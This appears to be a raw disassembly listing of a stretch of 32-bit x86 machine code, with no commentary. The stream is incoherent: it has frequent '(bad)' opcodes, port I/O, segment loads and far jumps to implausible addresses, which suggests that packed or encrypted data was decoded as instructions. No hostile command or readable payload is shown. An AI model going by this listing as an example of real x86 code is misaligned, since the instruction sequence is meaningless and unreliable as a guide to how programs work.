  420926:	repz imul eax,DWORD PTR [edx+0x5],0xffffffac
  42092b:	mov    edi,0x48f245a
  420930:	in     al,0x32
  420932:	add    al,BYTE PTR [ebx-0x12c7d231]
  420938:	jbe    0x4208d9
  42093a:	push   edx
  42093b:	out    0x55,al
  42093d:	addr16 clc 
  42093f:	mov    edx,0xd45ab421
  420944:	aam    0x70
  420946:	arpl   sp,dx
  420948:	adc    edx,DWORD PTR [eax-0x61]
  42094b:	adc    eax,0xb6fdd7b6
  420950:	push   esp
  420951:	(bad)  
  420952:	stc    
  420953:	shr    DWORD PTR [edx],0x90
  420956:	sbb    BYTE PTR [esi-0xcd799a],0x7
  42095d:	mov    ah,BYTE PTR [esi+0x7a]
  420960:	push   esi
  420961:	(bad)  
  420963:	rcl    edi,0xc2
  420966:	push   0xbce7b92e
  42096b:	cli    
  42096c:	pop    es
  42096d:	data16 and ch,al
  420970:	(bad)  
  420972:	not    BYTE PTR [esp+ebp*2-0x2e66b032]
  420979:	enter  0xcd98,0xdc
  42097d:	xor    al,0xd8
  42097f:	sbb    ah,BYTE PTR [ecx]
  420981:	outs   dx,BYTE PTR ds:[esi]
  420982:	std    
  420983:	push   eax
  420984:	loope  0x420915
  420986:	lods   al,BYTE PTR ds:[esi]
  420987:	push   ebp
  420988:	popf   
  420989:	aas    
  42098a:	repz sub bl,BYTE PTR [edi]
  42098d:	inc    edx
  42098e:	imul   esi,DWORD PTR [edi+0x4e],0xb7ac73e
  420995:	leave  
  420996:	sbb    DWORD PTR [ecx],edx
  420998:	dec    esp
  420999:	xchg   ebx,eax
  42099a:	jl     0x42097e
  42099c:	pop    esp
  42099d:	inc    ebx
  42099e:	mov    esp,0xe8ba49be
  4209a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209a4:	add    eax,0x93babd82
  4209a9:	jnp    0x420998
  4209ab:	jbe    0x420a10
  4209ad:	or     DWORD PTR [edi-0x4a62ae6d],edx
  4209b3:	push   ebp
  4209b4:	test   eax,0x28e20c5b
  4209b9:	sub    al,0x53
  4209bb:	(bad)  
  4209bc:	ror    DWORD PTR [eax],cl
  4209be:	pop    ds
  4209bf:	push   edx
  4209c0:	shl    eax,0x21
  4209c3:	push   ss
  4209c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c5:	in     al,dx
  4209c6:	fldenv [ecx+0xe]
  4209c9:	or     al,0x84
  4209cb:	cmc    
  4209cc:	div    BYTE PTR [esi+ebx*4+0x6a]
  4209d0:	test   al,0xc8
  4209d2:	mov    DWORD PTR [edx+0x4e],edi
  4209d5:	xor    ax,bp
  4209d8:	jno    0x42095b
  4209da:	inc    eax
  4209db:	inc    edi
  4209dc:	mov    ecx,0x534f69e9
  4209e1:	aaa    
  4209e2:	xor    eax,0x446c55e7
  4209e7:	sub    dh,cl
  4209e9:	sub    al,0x57
  4209eb:	dec    eax
  4209ec:	cli    
  4209ed:	ins    BYTE PTR es:[edi],dx
  4209ee:	inc    ebp
  4209ef:	sahf   
  4209f0:	inc    ecx
  4209f1:	cmc    
  4209f2:	mov    ds:0x34006834,al
  4209f7:	push   ss
  4209f8:	dec    esp
  4209f9:	arpl   WORD PTR [ecx+0x2b],sp
  4209fc:	lea    esi,[ebp+0x4c]
  4209ff:	out    dx,al
  420a00:	repnz aam 0x87
  420a03:	sbb    eax,0x68f744fc
  420a08:	push   esi
  420a09:	dec    esp
  420a0a:	dec    esp
  420a0b:	cmc    
  420a0c:	xlat   BYTE PTR ds:[ebx]
  420a0d:	fwait
  420a0e:	lahf   
  420a0f:	push   ebp
  420a10:	xor    ebx,DWORD PTR [ecx+esi*4-0x1c]
  420a14:	dec    edx
  420a15:	jb     0x4209e0
  420a17:	and    DWORD PTR [eax-0x1b],ebx
  420a1a:	xor    DWORD PTR [edx-0x4361bcd1],0x2b
  420a21:	fwait
  420a22:	mov    cl,0xbc
  420a24:	mov    eax,0x6b46f79c
  420a29:	mov    esp,DWORD PTR [ebx+0x4d80c213]
  420a2f:	mov    al,ds:0xd31c8d1f
  420a34:	test   DWORD PTR [eax+esi*4-0x43],ebp
  420a38:	mov    es,eax
  420a3a:	xchg   sp,ax
  420a3c:	cwde   
  420a3d:	inc    ebx
  420a3e:	adc    DWORD PTR [eax-0x19ecd3d0],ecx
  420a44:	jmp    0x6cee0b87
  420a49:	and    al,BYTE PTR [edi-0x4a9c3b49]
  420a4f:	ret    0x838c
  420a52:	ret    0xb372
  420a55:	jno    0x420ab5
  420a57:	call   0x63ca4db6
  420a5c:	pop    edi
  420a5d:	hlt    
  420a5e:	mov    edx,0x5ecb37a9
  420a63:	mov    ecx,0x1a8c86c2
  420a68:	sub    esi,DWORD PTR [esi+0x224be7c8]
  420a6e:	(bad)  
  420a6f:	sub    al,0x9b
  420a71:	je     0x420a6d
  420a73:	daa    
  420a74:	(bad)  
  420a75:	in     eax,dx
  420a76:	sub    eax,0xed9acd57
  420a7b:	dec    ebx
  420a7c:	pop    ds
  420a7d:	mov    bh,BYTE PTR [esi+0x69]
  420a80:	pusha  
  420a81:	inc    edx
  420a82:	or     eax,0xa9f38380
  420a87:	add    bh,dl
  420a89:	mov    bh,0xb9
  420a8b:	shl    edi,0x3b
  420a8e:	shl    DWORD PTR [ecx],1
  420a90:	pop    ebx
  420a91:	pop    ebx
  420a92:	and    cl,cl
  420a94:	sbb    dl,BYTE PTR gs:[ecx+0x0]
  420a98:	pop    ss
  420a99:	cmp    bl,0x29
  420a9c:	fisubr WORD PTR [ebx+0x6c924ff6]
  420aa2:	inc    DWORD PTR [ecx-0x47]
  420aa5:	mov    ch,BYTE PTR [eax-0x3c5fdbcf]
  420aab:	test   eax,0xc4957f9e
  420ab0:	inc    edi
  420ab1:	or     DWORD PTR [esi+0x1dbaeb69],ecx
  420ab7:	mov    eax,ds:0xbc1bdcb9
  420abc:	sbb    BYTE PTR [edx],cl
  420abe:	or     ah,BYTE PTR [edi+0x2f5f1e13]
  420ac4:	nop
  420ac5:	fwait
  420ac6:	rcr    BYTE PTR [ebx+0xbf2f61d],0xe4
  420acd:	in     al,dx
  420ace:	rol    esp,1
  420ad0:	fistp  DWORD PTR ds:0xd447b4c1
  420ad6:	dec    esp
  420ad7:	push   eax
  420ad8:	leave  
  420ad9:	pop    ss
  420ada:	je     0x420a68
  420adc:	(bad)  [eax+0x13]
  420adf:	and    eax,edi
  420ae1:	push   ebx
  420ae2:	xchg   ebx,eax
  420ae3:	adc    bl,BYTE PTR [eax+eax*8-0x38c851aa]
  420aea:	imul   esp
  420aec:	(bad)  
  420aed:	fistp  DWORD PTR [ecx+esi*8]
  420af0:	push   ecx
  420af1:	cmp    BYTE PTR [esi-0x69],ch
  420af4:	or     al,0xf2
  420af6:	stos   BYTE PTR es:[edi],al
  420af7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af8:	add    al,0x47
  420afa:	xor    eax,0xaf0efd1a
  420aff:	cmp    eax,0x9f8b13bb
  420b04:	xor    esp,DWORD PTR [ebx+0x3379f083]
  420b0a:	test   al,0x36
  420b0c:	loopne 0x420ab1
  420b0e:	or     al,0xe8
  420b10:	sub    al,0xeb
  420b12:	imul   edi,DWORD PTR [ebx+0x7fdce282],0x25ab1340
  420b1c:	mul    BYTE PTR gs:[esi+0x16f2722b]
  420b23:	aad    0x7
  420b25:	and    BYTE PTR es:[edi-0x4046e4d6],al
  420b2c:	sbb    DWORD PTR [ebx+esi*8-0x2a6c0623],0xb77e89bf
  420b37:	pop    esi
  420b38:	inc    edi
  420b39:	in     al,dx
  420b3a:	xchg   edi,eax
  420b3b:	adc    eax,0xb3889e70
  420b40:	and    eax,DWORD PTR [edx-0x1151c671]
  420b46:	and    BYTE PTR [edi-0x2a],0x39
  420b4a:	lods   al,BYTE PTR ds:[esi]
  420b4b:	mov    cl,0x5e
  420b4d:	fisubr WORD PTR [ecx-0x7e]
  420b50:	push   edi
  420b51:	addr16 out 0xa8,al
  420b54:	addr16 xchg edi,ecx
  420b57:	or     al,BYTE PTR [ecx]
  420b59:	mov    cl,0x58
  420b5b:	iret   
  420b5c:	or     BYTE PTR ds:0xc7932bbb,dh
  420b62:	ficomp DWORD PTR [ebx+edi*8-0x5]
  420b66:	les    eax,FWORD PTR [ecx]
  420b68:	sahf   
  420b69:	xchg   ebp,eax
  420b6a:	sar    BYTE PTR [eax+0x49],1
  420b6d:	mov    ch,BYTE PTR [ebx-0x52486cad]
  420b73:	dec    esi
  420b74:	xor    BYTE PTR [ecx-0xe],ch
  420b77:	packsswb mm2,mm1
  420b7a:	xchg   BYTE PTR [edx-0x15e017ad],ah
  420b80:	aas    
  420b81:	ror    BYTE PTR [esi+0x6f75d33f],cl
  420b87:	adc    eax,0x87438a36
  420b8c:	and    BYTE PTR [eax],ch
  420b8e:	jne    0x420bc8
  420b90:	nop
  420b91:	and    DWORD PTR [eax+0x59],ebp
  420b94:	or     DWORD PTR [eax-0x5f],ecx
  420b97:	rcl    BYTE PTR ds:0x146d13c0,0xea
  420b9e:	imul   eax,DWORD PTR [eax-0x76ce7d92],0xffffff84
  420ba5:	cwde   
  420ba6:	sbb    dl,BYTE PTR [eax-0x80]
  420ba9:	lahf   
  420baa:	pop    esp
  420bab:	sub    bp,0x7b90
  420bb0:	or     DWORD PTR [ebx+0x4072fd41],esp
  420bb6:	es lahf 
  420bb8:	data16 clc 
  420bba:	mov    ecx,0x274e4d87
  420bbf:	fwait
  420bc0:	sub    BYTE PTR [edi+0x5702efbf],ch
  420bc6:	rcl    DWORD PTR [ebx+0x7a],cl
  420bc9:	pop    ds
  420bca:	and    DWORD PTR [esi+edi*4],esp
  420bcd:	int    0xd3
  420bcf:	je     0x420c38
  420bd1:	pop    esp
  420bd2:	jecxz  0x420beb
  420bd4:	jnp    0x420b81
  420bd6:	je     0x420bff
  420bd8:	(bad)  
  420bd9:	dec    ebp
  420bda:	cli    
  420bdb:	cld    
  420bdc:	into   
  420bdd:	jle    0x420bd9
  420bdf:	inc    eax
  420be0:	repz ret 0xdc80
  420be4:	mov    esi,DWORD PTR [ebx+ebp*1+0x185002d2]
  420beb:	push   edi
  420bec:	jg     0x420c26
  420bee:	jbe    0x420b79
  420bf0:	addr16 push edx
  420bf2:	and    dl,BYTE PTR [ebp+ecx*4-0x6]
  420bf6:	cmp    BYTE PTR [ecx+0xc],ch
  420bf9:	stos   BYTE PTR es:[edi],al
  420bfa:	enter  0x1956,0x85
  420bfe:	pop    ebp
  420bff:	pop    ebp
  420c00:	push   ebx
  420c01:	les    ecx,FWORD PTR [ebx]
  420c03:	jecxz  0x420c74
  420c05:	jo     0x420c02
  420c07:	not    DWORD PTR [ecx]
  420c09:	fdiv   DWORD PTR [ebx-0x27a49517]
  420c0f:	pop    eax
  420c10:	shr    eax,cl
  420c12:	adc    esi,esp
  420c14:	and    BYTE PTR [ebx],0xf9
  420c17:	cmp    BYTE PTR [edi],ch
  420c19:	fistp  WORD PTR [ecx+0x66]
  420c1c:	cmp    BYTE PTR [ebp-0x6e],cl
  420c1f:	and    DWORD PTR [edx],esp
  420c21:	out    0xdf,eax
  420c23:	scas   al,BYTE PTR es:[edi]
  420c24:	adc    DWORD PTR [ebp-0x39],esi
  420c27:	lods   al,BYTE PTR ds:[esi]
  420c28:	pusha  
  420c29:	add    bl,BYTE PTR [edi-0x3f6dc170]
  420c2f:	ds int 0xf5
  420c32:	sar    DWORD PTR [esi-0xe5aab56],0x9b
  420c39:	enter  0x3432,0x98
  420c3d:	call   0x49bf00c3
  420c42:	adc    eax,DWORD PTR [edx]
  420c44:	push   0x19
  420c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c47:	popf   
  420c48:	fisttp DWORD PTR [ebx]
  420c4a:	test   BYTE PTR [ebp-0x51],ah
  420c4d:	sub    al,0x3b
  420c4f:	cmp    edx,0xffffff93
  420c52:	push   edi
  420c53:	mov    eax,ds:0x4ca30bac
  420c58:	sub    eax,0xd17c7ffb
  420c5d:	imul   ebx,DWORD PTR [esi],0xffffffd7
  420c60:	pop    es
  420c61:	stc    
  420c62:	std    
  420c63:	dec    esi
  420c64:	fldcw  WORD PTR [edi+0x4c1054e]
  420c6a:	mov    ah,0xc
  420c6c:	cdq    
  420c6d:	dec    esp
  420c6e:	clc    
  420c6f:	xor    al,0x57
  420c71:	js     0x420cf2
  420c73:	jge    0x420c20
  420c75:	sbb    DWORD PTR [ecx],0xd26645d2
  420c7b:	scas   al,BYTE PTR es:[edi]
  420c7c:	mov    ebx,0xb7959b04
  420c81:	ret    
  420c82:	adc    bh,dl
  420c84:	mov    bh,0xb1
  420c86:	sub    al,BYTE PTR [esi]
  420c88:	shl    bh,cl
  420c8a:	xor    al,0xa4
  420c8c:	xchg   esi,eax
  420c8d:	sbb    edx,edi
  420c8f:	mov    cl,0xd7
  420c91:	test   BYTE PTR [eax],cl
  420c93:	jp     0x420c38
  420c95:	mov    ds:0xe7a9543c,al
  420c9a:	(bad)
  420c9d:	pop    ss
  420c9e:	inc    ecx
  420c9f:	xor    dl,BYTE PTR [esp-0x26]
  420ca3:	inc    edx
  420ca4:	retf   0xa26c
  420ca7:	mov    ebp,0xeea53f4e
  420cac:	mov    ?,WORD PTR [esi+0x53]
  420caf:	or     eax,0x9ad0b526
  420cb4:	mov    ecx,0x57f8c030
  420cb9:	imul   edx,DWORD PTR [ebx-0x56ecba0f],0x8acba85e
  420cc3:	jb     0x420d26
  420cc5:	mov    ch,0xa8
  420cc7:	jno    0x420cd4
  420cc9:	adc    eax,0x793aaae
  420cce:	sbb    eax,0xbae721cd
  420cd3:	pushf  
  420cd4:	popf   
  420cd5:	or     BYTE PTR [eax],0xa3
  420cd8:	fucomp st(4)
  420cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cdb:	fwait
  420cdc:	sbb    BYTE PTR ds:0x4266a440,bl
  420ce2:	mov    ds,WORD PTR [ebx+0x24d2bb8d]
  420ce8:	jl     0x420cce
  420cea:	or     al,0x1a
  420cec:	fstp   TBYTE PTR [esi]
  420cee:	rcl    DWORD PTR [ebp+0x29],1
  420cf1:	test   al,0xb8
  420cf3:	ror    bh,0xa2
  420cf6:	arpl   dx,bp
  420cf8:	in     al,dx
  420cf9:	or     ebx,0xea4744ab
  420cff:	cmp    esi,DWORD PTR [esi-0x1c3382e6]
  420d05:	dec    ebx
  420d06:	call   0x402b46c0
  420d0b:	jge    0x420cb9
  420d0d:	xor    al,0x54
  420d0f:	dec    esp
  420d10:	mov    ebp,0x868cc540
  420d15:	pop    ebx
  420d16:	nop
  420d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d18:	mov    al,ds:0x4568c312
  420d1d:	mov    ebp,0xeeb3e73e
  420d22:	jno    0x420cb1
  420d24:	add    ebp,0xffffffd5
  420d27:	mov    al,bh
  420d29:	mov    dh,0xf7
  420d2b:	outs   dx,DWORD PTR ds:[esi]
  420d2c:	sbb    BYTE PTR [edx+eax*2],dl
  420d2f:	mov    edx,DWORD PTR [ebp-0x48]
  420d32:	jmp    0x423080
  420d37:	sub    eax,0xe7c03733
  420d3c:	fsub   QWORD PTR [ebp-0x7d]
  420d3f:	(bad)  [esi-0x53]
  420d42:	jle    0x420d21
  420d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d45:	pop    ds
  420d46:	xor    eax,edx
  420d48:	mov    bh,0x61
  420d4a:	bound  edx,QWORD PTR [ecx+0x5f]
  420d4d:	bound  esp,QWORD PTR [edx+0x67]
  420d50:	ficom  DWORD PTR [eax]
  420d52:	push   ds
  420d53:	and    DWORD PTR ds:0x1da037a8,ebx
  420d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d5a:	xchg   esp,eax
  420d5b:	xor    dh,BYTE PTR cs:[edx-0x1112e640]
  420d62:	xor    eax,esi
  420d64:	xor    BYTE PTR [esi-0x2f153c3d],ch
  420d6a:	dec    ebx
  420d6b:	add    al,0xe3
  420d6d:	mov    cl,0x4a
  420d6f:	popf   
  420d70:	xchg   ebp,eax
  420d71:	jl     0x420d00
  420d73:	dec    eax
  420d74:	xor    BYTE PTR [ebp+0x793e6b2a],ch
  420d7a:	mov    ch,0x21
  420d7c:	push   0x3e734657
  420d81:	inc    ebx
  420d82:	mov    al,ds:0x95eb1d11
  420d87:	jecxz  0x420db4
  420d89:	mov    eax,ds:0x112f2e58
  420d8e:	mul    DWORD PTR [esi+0x4fe26b8f]
  420d94:	inc    DWORD PTR [eax]
  420d96:	mov    WORD PTR [ecx+0x39c6b731],ds
  420d9c:	jmp    0x420d86
  420d9e:	xlat   BYTE PTR ds:[ebx]
  420d9f:	out    dx,eax
  420da0:	and    al,0x6
  420da2:	dec    esi
  420da3:	sbb    eax,DWORD PTR [eax+ebp*8]
  420da6:	inc    edi
  420da7:	pop    ecx
  420da8:	call   0x1f7e74aa
  420dad:	pslld  mm2,QWORD PTR [esi+0x3c]
  420db1:	sahf   
  420db2:	push   0x297a45c9
  420db7:	pop    esp
  420db8:	push   esi
  420db9:	pusha  
  420dba:	enter  0xdfde,0xde
  420dbe:	push   edi
  420dbf:	xchg   esp,eax
  420dc0:	add    al,0x20
  420dc2:	shr    BYTE PTR [ecx+0x47b6e109],0x8e
  420dc9:	punpckhbw mm0,QWORD PTR [esi+eax*4]
  420dcd:	test   al,0xd9
  420dcf:	in     eax,dx
  420dd0:	mov    esp,0xd445ab38
  420dd5:	lods   eax,DWORD PTR ds:[esi]
  420dd6:	inc    ebx
  420dd7:	ja     0x420daf
  420dd9:	cmp    BYTE PTR [esi+eiz*4],bh
  420ddc:	cmp    eax,0x3109e96f
  420de1:	outs   dx,BYTE PTR ds:[esi]
  420de2:	sbb    al,0x41
  420de4:	clc    
  420de5:	inc    ecx
  420de6:	jg     0x420e3e
  420de8:	pslld  mm1,QWORD PTR [edi+0x567ef2a8]
  420def:	mov    ah,0x2e
  420df1:	mov    DWORD PTR [ebx-0x60338b37],esp
  420df7:	or     edi,DWORD PTR [edx]
  420df9:	xor    esi,esi
  420dfb:	jecxz  0x420e6e
  420dfd:	nop
  420dfe:	pop    edx
  420dff:	add    esp,edi
  420e01:	in     eax,0x76
  420e03:	push   0xffffffb1
  420e05:	and    al,0x7f
  420e07:	outs   dx,DWORD PTR ds:[esi]
  420e08:	pusha  
  420e09:	push   0x90f0fd87
  420e0e:	mov    esi,0xbceb00d5
  420e13:	shl    BYTE PTR [esp+eax*8+0x38],1
  420e17:	cmp    bl,bl
  420e19:	in     eax,dx
  420e1a:	fadd   DWORD PTR [ebx+0x493302fd]
  420e20:	xor    eax,0x5eea8ef9
  420e25:	jno    0x420dc7
  420e27:	mov    ecx,DWORD PTR [ebp-0x51]
  420e2a:	repz (bad) 
  420e2f:	jae    0x420e39
  420e31:	icebp  
  420e32:	bound  ebp,QWORD PTR [edi-0x53]
  420e35:	mov    BYTE PTR [ecx],ah
  420e37:	int3   
  420e38:	xchg   esi,eax
  420e39:	iret   
  420e3a:	shl    DWORD PTR [edi],0xaa
  420e3d:	test   DWORD PTR [esi-0x565075ca],esi
  420e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e44:	sub    dl,BYTE PTR [esi+edi*8+0x57]
  420e48:	rcr    BYTE PTR [edi],1
  420e4a:	cmp    ebp,ecx
  420e4c:	ret    0xa02
  420e4f:	out    0x30,eax
  420e51:	jno    0x420e37
  420e53:	addr16 gs dec edx
  420e56:	mov    ch,0xba
  420e58:	out    0xc5,eax
  420e5a:	enter  0xa5ea,0x92
  420e5e:	out    0x9f,al
  420e60:	push   cs
  420e61:	jae    0x420eb0
  420e63:	xchg   ecx,eax
  420e64:	fist   WORD PTR [edx]
  420e66:	loop   0x420df7
  420e68:	inc    esp
  420e69:	dec    edx
  420e6a:	jns    0x420ed4
  420e6c:	mov    es,WORD PTR [edi]
  420e6e:	sub    BYTE PTR [eax-0x54cc7c0f],cl
  420e74:	xchg   esi,eax
  420e75:	xor    al,0x5a
  420e77:	(bad)  
  420e78:	hlt    
  420e79:	push   ebx
  420e7a:	sbb    edi,DWORD PTR [edx]
  420e7c:	ins    DWORD PTR es:[edi],dx
  420e7d:	clc    
  420e7e:	gs inc esi
  420e80:	push   ebx
  420e81:	in     eax,dx
  420e82:	pop    esi
  420e83:	or     ah,dh
  420e85:	lock pop ds
  420e87:	jne    0x420e70
  420e89:	lods   al,BYTE PTR ds:[esi]
  420e8a:	ret    
  420e8b:	inc    ebp
  420e8c:	je     0x420eca
  420e8e:	and    DWORD PTR [ecx+ebx*1+0x43],ebp
  420e92:	mov    WORD PTR [eax-0x704fca8],?
  420e98:	(bad)  
  420e99:	jmp    0x16b8:0xbf9a82bc
  420ea0:	dec    esi
  420ea1:	int    0xc0
  420ea3:	ret    
  420ea4:	mov    ebx,edi
  420ea6:	test   al,0x34
  420ea8:	fiadd  WORD PTR [edx+0x10]
  420eab:	test   DWORD PTR [ebp-0x66],ebx
  420eae:	into   
  420eaf:	inc    eax
  420eb0:	cmp    al,al
  420eb2:	das    
  420eb3:	pusha  
  420eb4:	sbb    al,0xff
  420eb6:	lea    ecx,ds:0x71a7128b
  420ebc:	aaa    
  420ebd:	xchg   esp,edx
  420ebf:	push   ebp
  420ec0:	in     al,0x4e
  420ec2:	int3   
  420ec3:	jmp    0x420e57
  420ec5:	jb     0x420eef
  420ec7:	ss jl  0x420e8f
  420eca:	jno    0x420f1b
  420ecc:	mov    bl,0xd4
  420ece:	xchg   ebx,eax
  420ecf:	xor    BYTE PTR [edx-0x73154928],0xe5
  420ed6:	push   ss
  420ed7:	scas   eax,DWORD PTR es:[edi]
  420ed8:	sbb    ah,al
  420eda:	stc    
  420edb:	lods   al,BYTE PTR ds:[esi]
  420edc:	shr    BYTE PTR [esi],0x76
  420edf:	stos   DWORD PTR es:[edi],eax
  420ee0:	in     al,0x30
  420ee2:	popa   
  420ee3:	and    al,dh
  420ee5:	mov    ds:0xa12cff93,eax
  420eea:	pop    ebp
  420eeb:	fucomp st(4)
  420eed:	stc    
  420eee:	jo     0x420f0f
  420ef0:	add    esp,DWORD PTR [edi]
  420ef2:	inc    DWORD PTR gs:[edi]
  420ef5:	pop    esi
  420ef6:	gs pop ebx
  420ef8:	sar    esp,1
  420efa:	lea    ebp,[ecx+0x3bec0797]
  420f00:	sti    
  420f01:	and    ch,al
  420f03:	mov    al,ds:0x4a399975
  420f08:	cmp    al,0x8c
  420f0a:	cmp    ch,BYTE PTR [ebp+0x32]
  420f0d:	push   esi
  420f0e:	jg     0x420f03
  420f10:	iret   
  420f11:	call   0xd0bd:0x80495666
  420f18:	add    ebp,DWORD PTR [ebx-0x378a5da5]
  420f1e:	sqrtps xmm7,XMMWORD PTR [ebx+0x1f]
  420f22:	dec    ebp
  420f23:	xor    eax,0xd1fade05
  420f28:	push   ebx
  420f29:	hlt    
  420f2a:	jmp    0x58ed981f
  420f2f:	add    eax,0x7cf9e9ce
  420f34:	ins    BYTE PTR es:[edi],dx
  420f35:	fadd   QWORD PTR [esi-0x33]
  420f39:	mov    DWORD PTR [ecx-0x2f],edx
  420f3c:	mov    esi,0x616d58d9
  420f41:	clc    
  420f42:	jo     0x420fb8
  420f44:	xchg   ecx,eax
  420f45:	push   eax
  420f46:	int3   
  420f47:	(bad)  
  420f49:	sbb    eax,eax
  420f4b:	sub    BYTE PTR [ecx+0x4a71a180],0xe6
  420f52:	test   DWORD PTR [esi],esi
  420f54:	bound  esi,QWORD PTR [ecx]
  420f56:	cmp    eax,0x50fe29ae
  420f5b:	adc    eax,0x6c475658
  420f60:	ss add al,0xd5
  420f63:	test   BYTE PTR [eax-0x6018dfd3],0x4b
  420f6a:	lock inc ebx
  420f6c:	stos   BYTE PTR es:[edi],al
  420f6d:	pop    es
  420f6e:	xchg   BYTE PTR [edx+0x3f],bl
  420f71:	les    edi,FWORD PTR [ebp-0x60]
  420f74:	jmp    FWORD PTR [edi]
  420f76:	xor    bl,bh
  420f78:	fnstsw WORD PTR [edx+eiz*8]
  420f7b:	cld    
  420f7c:	adc    al,0xdf
  420f7e:	fsub   QWORD PTR [esi-0x52612022]
  420f84:	mov    ebp,0x249422f9
  420f89:	jmp    0x794e83aa
  420f8e:	test   eax,0x90a87a5b
  420f93:	sbb    ecx,0xc779649b
  420f99:	test   ebx,0x6c45803c
  420f9f:	mov    ecx,0x83af6239
  420fa4:	int    0xa4
  420fa6:	mov    DWORD PTR [ecx],esi
  420fa8:	adc    DWORD PTR [edx-0xb],edi
  420fab:	cmp    dh,BYTE PTR [ecx]
  420fad:	int3   
  420fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420faf:	aad    0xa0
  420fb1:	in     eax,dx
  420fb2:	jne    0x420f6c
  420fb4:	inc    ecx
  420fb5:	xchg   ebx,eax
  420fb6:	push   ebx
  420fb7:	mov    edi,0x1d48fe2e
  420fbc:	sahf   
  420fbd:	sbb    dl,BYTE PTR [esi]
  420fbf:	imul   ebp,DWORD PTR [edx+0x418f1e89],0x5806c5f6
  420fc9:	jnp    0x420fad
  420fcb:	adc    DWORD PTR [esi+eiz*8-0x16ce5795],ecx
  420fd2:	(bad)  
  420fd3:	sahf   
  420fd4:	jmp    0x91a:0x3b900386
  420fdb:	mov    ecx,0xa4ece3ea
  420fe0:	and    DWORD PTR [edx+edi*2],eax
  420fe3:	cwde   
  420fe4:	mov    dl,0x5f
  420fe6:	or     bh,BYTE PTR [edx+ebx*1+0x16]
  420fea:	test   eax,0x2d67cd45
  420fef:	sbb    ch,BYTE PTR [eax+0xd8efd0d]
  420ff5:	std    
  420ff6:	push   es
  420ff7:	aaa    
  420ff8:	push   ebp
  420ff9:	pop    ds
  420ffa:	repnz ror bl,0xf3
  420ffe:	sbb    al,0xa1
  421000:	push   edx
  421001:	ss mov al,0xfd
  421004:	outs   dx,DWORD PTR ds:[esi]
  421005:	ins    BYTE PTR es:[edi],dx
  421006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421007:	xchg   edi,eax
  421008:	ins    DWORD PTR es:[edi],dx
  421009:	ret    
  42100a:	inc    edi
  42100b:	inc    ebx
  42100c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42100d:	(bad)  
  42100f:	add    ebp,0xfffffffd
  421012:	scas   al,BYTE PTR es:[edi]
  421013:	mov    esp,0xde1beff
  421018:	icebp  
  421019:	enter  0x2d18,0xd8
  42101d:	add    dl,BYTE PTR [ecx+esi*1+0x51925603]
  421024:	push   ss
  421025:	mov    ds:0x3cc2b083,al
  42102a:	loopne 0x42106f
  42102c:	cs xchg esp,eax
  42102e:	cmp    BYTE PTR [edi-0x2d],al
  421031:	jnp    0x420fb3
  421033:	or     eax,0xcc7083d2
  421038:	stc    
  421039:	lock and bl,BYTE PTR ss:[esi]
  42103d:	out    0x82,eax
  42103f:	test   al,0xee
  421041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421042:	mov    esi,0xd10df369
  421047:	mov    dh,ch
  421049:	pop    ebx
  42104a:	mov    eax,0xf4fb61dc
  42104f:	in     al,0x24
  421051:	(bad)  
  421052:	mov    dl,0x29
  421054:	xor    cl,ch
  421056:	ror    bl,1
  421058:	mov    ecx,0xc038ed4e
  42105d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105e:	adc    DWORD PTR [ebx],0x781b36c3
  421064:	sbb    BYTE PTR [eax],0x13
  421067:	std    
  421068:	push   edx
  421069:	mov    dh,dl
  42106b:	xor    bl,cl
  42106d:	fcomip st,st(0)
  42106f:	sahf   
  421070:	mov    WORD PTR ds:0x91d2029a,fs
  421076:	pop    ss
  421077:	mov    eax,0xa6ce1165
  42107c:	jge    0x42105a
  42107e:	stc    
  42107f:	lea    eax,[eax+0x60c9ae13]
  421085:	mov    ds,WORD PTR [ebx]
  421087:	rol    BYTE PTR [ebp+0x35],0x23
  42108b:	(bad)  
  42108c:	aad    0x1
  42108e:	out    dx,eax
  42108f:	ins    DWORD PTR es:[edi],dx
  421090:	enter  0x2a45,0xce
  421094:	xor    cl,dl
  421096:	arpl   WORD PTR [ebx+0x911a537],di
  42109c:	retf   0xecae
  42109f:	sbb    dl,BYTE PTR [ecx]
  4210a1:	xor    al,0xfb
  4210a3:	inc    esp
  4210a4:	imul   ebp,DWORD PTR [ebp+0x8],0x40
  4210a8:	(bad)  
  4210a9:	push   0xffffff93
  4210ab:	outs   dx,DWORD PTR ds:[esi]
  4210ac:	sbb    DWORD PTR ds:0xf70235f4,0xffffffee
  4210b3:	out    0x49,al
  4210b5:	push   ebx
  4210b6:	push   ecx
  4210b7:	mov    BYTE PTR [ebp+0x3ca05981],dh
  4210bd:	add    BYTE PTR [ecx-0x50],dh
  4210c0:	fdiv   st,st(3)
  4210c2:	mov    ds:0x47acec96,eax
  4210c7:	pop    eax
  4210c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210c9:	je     0x4210a2
  4210cb:	cli    
  4210cc:	test   BYTE PTR [eax+0x5703ca0a],al
  4210d2:	icebp  
  4210d3:	mov    DWORD PTR [edi+0x5ce966a2],ecx
  4210d9:	dec    esp
  4210da:	xor    bh,BYTE PTR [esp+edi*8]
  4210dd:	mov    DWORD PTR [eax],0xa2822c5a
  4210e3:	adc    BYTE PTR [edi],cl
  4210e5:	adc    cl,BYTE PTR [esi]
  4210e7:	mov    ebx,0xa93239d9
  4210ec:	cwde   
  4210ed:	cld    
  4210ee:	out    dx,eax
  4210ef:	jge    0x421133
  4210f1:	inc    eax
  4210f2:	cmp    al,0x7d
  4210f4:	popa   
  4210f5:	xchg   ebp,eax
  4210f6:	sahf   
  4210f7:	stos   DWORD PTR es:[edi],eax
  4210f8:	nop
  4210f9:	jmp    0x421160
